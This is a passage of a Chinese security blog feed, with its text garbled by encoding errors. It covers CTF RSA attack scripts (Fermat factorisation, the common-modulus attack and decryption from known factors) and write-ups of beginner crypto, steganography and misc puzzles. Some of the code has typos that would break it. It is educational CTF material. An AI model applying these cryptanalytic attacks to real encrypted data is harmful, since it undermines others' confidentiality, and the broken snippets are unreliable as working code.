å¯†è¿‡ç¨‹ï¼ˆå‡ºé¢˜è„šæœ¬ï¼‰" class="headerlink" title="RSAåŠ å¯†è¿‡ç¨‹ï¼ˆå‡ºé¢˜è„šæœ¬ï¼‰"></a>RSAåŠ å¯†è¿‡ç¨‹ï¼ˆå‡ºé¢˜è„šæœ¬ï¼‰</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">#ç”Ÿæˆ1024ä½éšæœºç´ æ•°</span><br><span class="line">p=libnum.generate_prime(1024)</span><br><span class="line">q=libnum.generate_prime(1024)</span><br><span class="line">e=65537</span><br><span class="line">m=&quot;SkyMirror&#123;20d6e2dsgfdf1fa5f5432a436c4be18&#125;&quot;</span><br><span class="line">#å­—ç¬¦ä¸²è½¬æ•°å­—</span><br><span class="line">m=libnum.s2n(m)</span><br><span class="line">n=p*q</span><br><span class="line">phi_n=(p-1)*(q-1)</span><br><span class="line">#æ±‚é€†å…ƒ</span><br><span class="line">d=libnum.invmod(e,phi_n)</span><br><span class="line">c=pow(m,e,n)</span><br></pre></td></tr></table></figure><h3 id="å·²çŸ¥n-d-e-cæ±‚m"><a href="#å·²çŸ¥n-d-e-cæ±‚m" class="headerlink" title="å·²çŸ¥n,d,e,cæ±‚m"></a>å·²çŸ¥n,d,e,cæ±‚m</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n= </span><br><span class="line">d= </span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">c= </span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m).decode())</span><br></pre></td></tr></table></figure><h3 id="å·²çŸ¥pï¼Œqï¼Œeï¼Œcæ±‚m"><a href="#å·²çŸ¥pï¼Œqï¼Œeï¼Œcæ±‚m" class="headerlink" title="å·²çŸ¥pï¼Œqï¼Œeï¼Œcæ±‚m"></a>å·²çŸ¥pï¼Œqï¼Œeï¼Œcæ±‚m</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ±‚é€†å…ƒ</span></span><br><span class="line">d=libnum.invmod(e,phi_n)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•°å­—è½¬å­—èŠ‚ï¼Œè½¬å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(libnum.ns2(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h2 id="RSAå¯†é’¥ç”Ÿæˆç®¡ç†"><a href="#RSAå¯†é’¥ç”Ÿæˆç®¡ç†" class="headerlink" title="RSAå¯†é’¥ç”Ÿæˆç®¡ç†"></a>RSAå¯†é’¥ç”Ÿæˆç®¡ç†</h2><p>å®‰è£… pycryptodomeæ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycryptodome</span><br></pre></td></tr></table></figure><p><a href="https://www.pycryptodome.org/en/latest/src/introduction.html">PyCryptodome â€” PyCryptodome 3.12.0 æ–‡æ¡£</a>  å®˜æ–¹æ–‡æ¡£è´´è´´</p><h3 id="å…¬é’¥ç”Ÿæˆ"><a href="#å…¬é’¥ç”Ÿæˆ" class="headerlink" title="å…¬é’¥ç”Ÿæˆ"></a>å…¬é’¥ç”Ÿæˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Publickey import RSA</span><br><span class="line"></span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">d=</span><br><span class="line">e=</span><br><span class="line"></span><br><span class="line">rsa_components = (n,e)   </span><br><span class="line">keypair = RSA.construct(rsa_componets)</span><br><span class="line">with open(&#x27;pubckey.pem&#x27;,&#x27;wb&#x27;) as f:</span><br><span class="line">f.write(keypair.exportKey())</span><br></pre></td></tr></table></figure><h3 id="ç§é’¥ç”Ÿæˆ"><a href="#ç§é’¥ç”Ÿæˆ" class="headerlink" title="ç§é’¥ç”Ÿæˆ"></a>ç§é’¥ç”Ÿæˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">d=</span><br><span class="line">e=</span><br><span class="line"></span><br><span class="line">rsa_componets = (n,e,d,p,q)</span><br><span class="line">keypair = RSA.construct(rsa_components)</span><br><span class="line">with open(&#x27;private.pem&#x27;,&#x27;wb&#x27;) as f:</span><br><span class="line">f.write(keypair.exportKey())</span><br></pre></td></tr></table></figure><h3 id="å…¬é’¥è¯»å–"><a href="#å…¬é’¥è¯»å–" class="headerlink" title="å…¬é’¥è¯»å–"></a>å…¬é’¥è¯»å–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">with open(&quot;pubckey.pem&quot;,&#x27;rb&#x27;) as f:</span><br><span class="line">key = RSA.imort_key(f.read())</span><br><span class="line">print(&#x27;n=%d&#x27;%key.n)</span><br><span class="line">print(&#x27;e=%d&#x27;%key.e)</span><br></pre></td></tr></table></figure><h3 id="ç§é’¥è¯»å–"><a href="#ç§é’¥è¯»å–" class="headerlink" title="ç§é’¥è¯»å–"></a>ç§é’¥è¯»å–</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;private.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">key = RSA.import_key(f.read())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e = %d&#x27;</span> % key.e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;d = %d&#x27;</span> % key.d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p = %d&#x27;</span> % key.p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;q = %d&#x27;</span> % key.q)</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»ƒä¹ é¶åœºï¼šRSAåŸºç¡€</p><h2 id="åŸºäºNåˆ†è§£çš„RSAé¢˜ç›®"><a href="#åŸºäºNåˆ†è§£çš„RSAé¢˜ç›®" class="headerlink" title="åŸºäºNåˆ†è§£çš„RSAé¢˜ç›®"></a>åŸºäºNåˆ†è§£çš„RSAé¢˜ç›®</h2><p>å¯¹Nè¿›è¡Œåˆ†è§£ï¼ˆåªè¦çŸ¥é“på’Œq,å°±èƒ½è§£å‡ºä»»ä½•rsaï¼‰</p><p>Nåœ¨æœ‰ä¸€èˆ¬æƒ…å†µä¸‹ä¸å¯åˆ†è§£çš„ï¼Œå¦‚æœpå’Œqå¤ªæ¥è¿‘ï¼Œæˆ–ç›¸å·®è¿‡å¤§ï¼Œæˆ–pqå¾ˆå°ç­‰æƒ…å†µ</p><h3 id="1-åœ¨çº¿æŸ¥è¯¢åˆ†è§£ç½‘ç«™ï¼ˆfirst-choiceï¼‰"><a href="#1-åœ¨çº¿æŸ¥è¯¢åˆ†è§£ç½‘ç«™ï¼ˆfirst-choiceï¼‰" class="headerlink" title="1.åœ¨çº¿æŸ¥è¯¢åˆ†è§£ç½‘ç«™ï¼ˆfirst choiceï¼‰"></a>1.åœ¨çº¿æŸ¥è¯¢åˆ†è§£ç½‘ç«™ï¼ˆfirst choiceï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.factordb.com/index.php</span><br></pre></td></tr></table></figure><h3 id="2-ä½¿ç”¨yafuå·¥å…·åˆ†è§£"><a href="#2-ä½¿ç”¨yafuå·¥å…·åˆ†è§£" class="headerlink" title="2.ä½¿ç”¨yafuå·¥å…·åˆ†è§£"></a>2.ä½¿ç”¨yafuå·¥å…·åˆ†è§£</h3><p>ä¸‹è½½åœ°å€ï¼š<a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a></p><h3 id="3-ä½¿ç”¨è´¹é©¬åˆ†è§£"><a href="#3-ä½¿ç”¨è´¹é©¬åˆ†è§£" class="headerlink" title="3.ä½¿ç”¨è´¹é©¬åˆ†è§£"></a>3.ä½¿ç”¨è´¹é©¬åˆ†è§£</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def isqrt(n):</span><br><span class="line">  x = n</span><br><span class="line">  y = (x + n // x) // 2</span><br><span class="line">  while y &lt; x:</span><br><span class="line">    x = y</span><br><span class="line">    y = (x + n // x) // 2</span><br><span class="line">  return x</span><br><span class="line"></span><br><span class="line">def fermat(n, verbose=True):</span><br><span class="line">    a = isqrt(n) # int(ceil(n**0.5))</span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(n) # int(b2**0.5)</span><br><span class="line">    count = 0</span><br><span class="line">    while b*b != b2:</span><br><span class="line">        # if verbose:</span><br><span class="line">        #     print(&#x27;Trying: a=%s b2=%s b=%s&#x27; % (a, b2, b))</span><br><span class="line">        a = a + 1</span><br><span class="line">        b2 = a*a - n</span><br><span class="line">        b = isqrt(b2) # int(b2**0.5)</span><br><span class="line">        count += 1</span><br><span class="line">    p=a+b</span><br><span class="line">    q=a-b</span><br><span class="line">    assert n == p * q</span><br><span class="line">    # print(&#x27;a=&#x27;,a)</span><br><span class="line">    # print(&#x27;b=&#x27;,b)</span><br><span class="line">    # print(&#x27;p=&#x27;,p)</span><br><span class="line">    # print(&#x27;q=&#x27;,q)</span><br><span class="line">    # print(&#x27;pq=&#x27;,p*q)</span><br><span class="line">    return p, q</span><br><span class="line">fermat(n)</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»ƒä¹ é¶åœºï¼šRSAç´ æ•°åˆ†è§£</p><h1 id="å…±æ¨¡æ”»å‡»è„šæœ¬"><a href="#å…±æ¨¡æ”»å‡»è„šæœ¬" class="headerlink" title="å…±æ¨¡æ”»å‡»è„šæœ¬"></a>å…±æ¨¡æ”»å‡»è„šæœ¬</h1><p><strong>é€‚ç”¨æƒ…å†µ</strong>ï¼šå¤šç»„å¯†æ–‡ä½¿ç”¨åŒä¸€ä¸ªæ¨¡æ•°nåŠ å¯†çš„æƒ…å†µï¼Œä¸åŒeä¹‹é—´ä¸¤ä¸¤äº’è´¨</p><p>åŒä¸€æ˜æ–‡ï¼ŒåŒä¸€nä¸åŒeï¼Œè¿›è¡ŒåŠ å¯†ã€‚m,nç›¸åŒï¼›e,cä¸åŒï¼Œä¸”e1å’Œe2äº’è´¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same_n_attack</span>(<span class="params">e1,e2,c1,c2,n</span>):</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br></pre></td></tr></table></figure><p>peace yo~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-RSA-ä¸€&quot;&gt;&lt;a href=&quot;#CTF-RSA-ä¸€&quot; class=&quot;headerlink&quot; title=&quot;CTF-RSA(ä¸€)&quot;&gt;&lt;/a&gt;CTF-RSA(ä¸€)&lt;/h1&gt;&lt;h2 id=&quot;RSAå‘å±•ç®€å²&quot;&gt;&lt;a href=&quot;#RSAå‘å±•ç®€å²&quot; class=&quot;</summary>
      
    
    
    
    <category term="å¯†ç å­¦" scheme="http://websec.space/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="å¯†ç å­¦" scheme="http://websec.space/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>èŒæ–°é¢˜wp(ä¸Šç¯‡)</title>
    <link href="http://websec.space/2022/01/07/%E8%90%8C%E6%96%B0%E9%A2%98wp/"/>
    <id>http://websec.space/2022/01/07/%E8%90%8C%E6%96%B0%E9%A2%98wp/</id>
    <published>2022-01-06T16:00:00.000Z</published>
    <updated>2022-01-07T15:57:51.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="èŒæ–°é¢˜wp-ä¸Šç¯‡"><a href="#èŒæ–°é¢˜wp-ä¸Šç¯‡" class="headerlink" title="èŒæ–°é¢˜wp(ä¸Šç¯‡)"></a>èŒæ–°é¢˜wp(ä¸Šç¯‡)</h1><p>å†™ä¸€æ‰‹èŒæ–°é¢˜æƒå½“æ‘¸é±¼äº†</p><h2 id="èŒæ–°-å¯†ç 1"><a href="#èŒæ–°-å¯†ç 1" class="headerlink" title="èŒæ–°_å¯†ç 1"></a>èŒæ–°_å¯†ç 1</h2><p>53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D</p><p>ç›´æ¥å¼€è§£</p><p><img src="https://img-blog.csdnimg.cn/5e0506ef16854f47bd5ce8d7020f72b7.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>base16åé¢è¿™ä¸ªç­‰å·ï¼ˆDNAåŠ¨äº†ï¼‰é‚£å†è½¬ä¸€æ¬¡</p><p><img src="https://img-blog.csdnimg.cn/845b5c307823425ebf0a2b4c1486a94e.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>ç¬¬ä¸€æ„Ÿè§‰æ˜¯è½¬å‡ºæ¥äº†ï¼Œåé¢æƒ³æƒ³ä¸å¯¹åŠ²ï¼Œæœç„¶æ …æ å•Š</p><p><img src="https://img-blog.csdnimg.cn/248cb03074be4081805efa1f27bcadaf.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="èŒæ–°-å¯†ç 2"><a href="#èŒæ–°-å¯†ç 2" class="headerlink" title="èŒæ–°_å¯†ç 2"></a>èŒæ–°_å¯†ç 2</h2><p>å‡ºé¢˜äººå·²ç´¯ï¼Œéšä¾¿æ•²äº†å‡ ä¸‹é”®ç›˜ã€‚ã€‚ã€‚ rdcvbg 2qase3 6tghu7 flagæ ¼å¼KEY{XXXXXX} </p><p>å…ˆæ˜¯æŒ‰ç…§å­—æ¯åœ¨é”®ç›˜ä¸Šç»„æˆçš„å½¢çŠ¶è¯•çš„å¤±è´¥äº†ï¼Œåˆšåœ¨æƒ³è¿™ä¹ˆéš¾æã€‚</p><p>çªç„¶æƒ³åˆ°è¿™å‡ ä¸ªå­—æ¯å›´èµ·æ¥çš„å­—æ¯æœ‰å¯èƒ½ï¼Œæœç„¶orzã€‚</p><h2 id="èŒæ–°-å¯†ç 3"><a href="#èŒæ–°-å¯†ç 3" class="headerlink" title="èŒæ–° å¯†ç 3"></a>èŒæ–° å¯†ç 3</h2><p>é¢˜ç›®åç§°ï¼šæˆ‘æƒ³åƒåŸ¹æ ¹ é¢˜ç›®æè¿°ï¼š â€“ â€” .-. â€¦ . ..â€“.- .. â€¦ ..â€“.- -.-. â€” â€” .-.. ..â€“.- -â€¦ ..- - ..â€“.- -â€¦ .- -.-. â€” -. ..â€“.- .. â€¦ ..â€“.- -.-. â€” â€” .-.. . .-. ..â€“.- â€“ â€“ -.. -.. â€“ -.. â€“ -.. â€“ â€“ â€“ -.. -.. -.. /â€“ -.. â€“ -..  -.. â€“/ â€“ â€“ â€“ â€“ â€“ /â€“ -.. -.. â€“ -.. â€“ /â€“ -.. -.. â€“ æ ¼å¼ï¼šflag{***********}                                                           </p><p>æƒ³åƒåŸ¹æ ¹ï¼Ÿï¼Œé‚£å¿…ç„¶æ˜¯åŸ¹æ ¹å§ã€‚</p><p>ä½†ç°åœ¨æ˜æ˜¾æ˜¯è«æ–¯ç”µç ï¼Œå…ˆè¿›è¡Œä¸€æ¬¡è§£å¯†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/293c822b709c4589b28d6733297f8eb6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">MORSES COOL BUT BACONS COOLERï¼ˆå¥½å®¶ä¼™)ï¼Œæ‹¿mdè¿™ä¸€å¥—è½¬ä¸€ä¸‹bacon</p><p>å› ä¸ºåŸ¹æ ¹å¯†ç åªæœ‰Aå’ŒB</p><p>æ‰€ä»¥æŠŠMæ›¿æ¢æˆAï¼ŒæŠŠDæ›¿æ¢æˆBã€‚</p><p><img src="https://img-blog.csdnimg.cn/ad62448412a34e608b651e2d809760f9.png" alt="img" style="zoom: 50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="èŒæ–°-éšå†™2"><a href="#èŒæ–°-éšå†™2" class="headerlink" title="èŒæ–° éšå†™2"></a>èŒæ–° éšå†™2</h2><p><img src="https://img-blog.csdnimg.cn/de09464dcae048d5a392ffea5d8fc9e9.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">                                                                                               </p><p>æœç„¶æ˜¯æš´åŠ›ç ´è§£å‹ç¼©åŒ…çš„é¢˜ï¼Œç›´æ¥ä¸Šå·¥å…·ã€‚                                    </p><p><img src="https://img-blog.csdnimg.cn/f819d6222a214b5889292d915b2f72a1.png" alt="img" style="zoom:33%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">    </p><p>æå®š</p><p><img src="https://img-blog.csdnimg.cn/3cf47f713ed342e38fea1914ef47ebe4.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="èŒæ–°-éšå†™4"><a href="#èŒæ–°-éšå†™4" class="headerlink" title="èŒæ–° éšå†™4"></a>èŒæ–° éšå†™4</h2><p><img src="https://img-blog.csdnimg.cn/64ae8be3007a4ecea3c30b8dd8dd12cf.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>å¼€å§‹ä»¥ä¸ºæ˜¯å›¾ç‰‡é¢˜ï¼Œä½†ä¸ºå•¥å›¾ç‰‡åååœ¨ä¸€ä¸ªwordé‡Œé¢ã€‚</p><p><img src="https://img-blog.csdnimg.cn/b98ab04d052942f789f6d030790ea80b.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æ‰“å¼€äº†éšè—å­—ç¬¦å°±å‘ç°æœç„¶</p><img src="https://img-blog.csdnimg.cn/8b3ea2b0ebe2464388333bf0837625c1.png" alt="img" style="zoom:50%;" /><p>é€‚åˆæ‘¸é±¼æ—¶ä½¿ç”¨å“ˆå“ˆå“ˆå“ˆã€‚</p><h2 id="èŒæ–°-å¯†ç -4"><a href="#èŒæ–°-å¯†ç -4" class="headerlink" title="èŒæ–° å¯†ç #4"></a>èŒæ–° å¯†ç #4</h2><p>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</p><p><img src="https://img-blog.csdnimg.cn/5e24e143d36a4a2d902fa407bf79cfb6.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æŠŠ&amp;lt ; æ¢æˆ&lt;ï¼ˆå¤ªè‰¹äº†ï¼Œæˆ‘åœ¨å†™markdownï¼Œç«Ÿç„¶ä¹Ÿè‡ªåŠ¨è½¬æ¢ä¸º&lt;)</p><p><img src="https://img-blog.csdnimg.cn/fc903ac41c4d4cf7bd598b47c762842a.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="èŒæ–°-éšå†™3"><a href="#èŒæ–°-éšå†™3" class="headerlink" title="èŒæ–° éšå†™3"></a>èŒæ–° éšå†™3</h2><p>å•çº¯ä½¿ç”¨å·¥å…·çš„é¢˜StegSolve</p><p><img src="https://img-blog.csdnimg.cn/ce0769e94650498bb97284b6c1d3e8f2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="æ‚é¡¹1"><a href="#æ‚é¡¹1" class="headerlink" title="æ‚é¡¹1"></a>æ‚é¡¹1</h2><p>å°æ˜æƒ³ç»™å¿ƒçˆ±çš„å¦¹å­è¡¨ç™½å¾ˆä¹…ï¼Œå¯æ˜¯ä¸çŸ¥é“æ€ä¹ˆå¼€å£ï¼Œä½ èƒ½å¸®å¸®å°æ˜å—ï¼Ÿ å·²çŸ¥ md5(è¡¨ç™½çš„è¯+ctf)=ed400fbcff269bd9c65292a97488168a æäº¤flag{è¡¨ç™½çš„è¯}</p><p>ï¼Ÿï¼Ÿï¼Ÿï¼Ÿå¦¹å­è¿˜å¾—è§£md5ï¼Œä½ æ´»è¯¥å•èº«ã€‚</p><p>ä¸è¿‡å°±æ˜¯md5åŠ äº†ç›å€¼ï¼Œæ¨èå¤§å®¶å»å­¦ä¹ ä¸€ä¸‹pythonæš´åŠ›ç ´è§£çš„è„šæœ¬æ€ä¹ˆå†™çš„ã€‚</p><p>è¿™é‡Œæ²¡å•¥è¯´çš„æ‰¾ä¸ªç½‘ç«™å°±ç»™ç ´è§£äº†ã€‚</p><h2 id="æ‚é¡¹2"><a href="#æ‚é¡¹2" class="headerlink" title="æ‚é¡¹2"></a>æ‚é¡¹2</h2><p><img src="https://img-blog.csdnimg.cn/4a739b86a23340509e7a926cc3a0e57d.png" alt="img" style="zoom: 67%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>010editoræ‰“å¼€èƒ½çœ‹è§</p><p>å…¶å®è¿˜å¯ä»¥ç”¨å·¥å…·ç›´æ¥æœã€‚</p><p><img src="https://img-blog.csdnimg.cn/894c4ceb35874515a8b789f0426310d7.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="èŒæ–°-æ‚é¡¹3"><a href="#èŒæ–°-æ‚é¡¹3" class="headerlink" title="èŒæ–° æ‚é¡¹3"></a>èŒæ–° æ‚é¡¹3</h2><p>å¤§å®¶å¥½æˆ‘æ˜¯å°èŒæ–°ç¾½ï¼Œå‰ä¸ä¹…æˆ‘çš„ä¸€ä¸ªæœ‹å‹ç»™æˆ‘äº†ä¸€å¼ é“¶è¡Œå¡ï¼Œä»–è¯´é‡Œé¢æœ‰ä¸€å¤§ç¬”é’±ï¼Œä½†æ˜¯ä»–åªå‘Šè¯‰æˆ‘ä»–çš„ç”Ÿæ—¥æ˜¯ä¹ä¸ƒå¹´åæœˆä¸€æ—¥ï¼Œä½ èƒ½å¸®æˆ‘çŒœçŒœä»–çš„é“¶è¡Œå¡å¯†ç æ˜¯å¤šå°‘å—ï¼Œå“¦å¯¹ï¼Œè¿™ä¸ªæœ‹å‹æœ‰ä¸ªå°åå«å°äº”ã€‚ flagæ ¼å¼ï¼šflag{é“¶è¡Œå¡å¯†ç }                                                           </p><p>è¯è¯´ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦è¿™ç§é¢˜ï¼Œé“¶è¡Œå¡å¯†ç æ˜¯6ä½ï¼Œå…ˆè¯•äº†ä¸‹971001ç»“æœä¸å¯¹ï¼Œç„¶åè¯•971015å¯¹äº†</p><h2 id="æ‚é¡¹4"><a 